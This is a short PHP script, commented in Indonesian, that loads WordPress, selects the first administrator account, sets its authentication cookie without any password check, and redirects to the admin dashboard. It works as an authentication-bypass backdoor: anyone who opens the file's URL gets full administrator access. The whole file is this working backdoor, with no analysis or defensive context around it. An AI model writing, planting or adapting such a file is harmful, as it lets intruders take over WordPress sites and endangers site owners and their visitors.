<?php
require_once(rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php");

$users = get_users(['role' => 'administrator']);

if (!empty($users)) {
    $admin_user = $users[0]; // Ambil administrator pertama

    $user = get_user_by('login', $admin_user->user_login);
    
    if ($user && user_can($user, "administrator")) {
        wp_clear_auth_cookie();
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);

        $redirect_to = admin_url();
        wp_safe_redirect($redirect_to);
        exit();
    }
}

// Jika tidak ada administrator atau gagal login, tampilkan pesan agar file tidak blank
echo "Tidak dapat login secara otomatis.";
?>
